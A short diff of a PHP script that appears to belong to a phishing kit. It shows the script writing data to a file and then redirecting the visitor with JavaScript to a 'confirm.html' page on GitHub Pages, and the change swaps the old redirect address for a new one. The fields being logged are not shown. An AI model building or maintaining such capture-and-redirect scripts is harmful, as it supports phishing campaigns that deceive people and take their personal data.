@@ -71,7 +71,8 @@ fwrite($handle, "\n");
 fclose($handle);
 echo "<script LANGUAGE=\"JavaScript\">
 <!--
-window.location=\"https://adsrewards.github.io/settings/confirm.html\";
+window.location=\"https://sayabanr.github.io/Confir/confirm.html\";
 // -->
 </script>";
+
 ?>
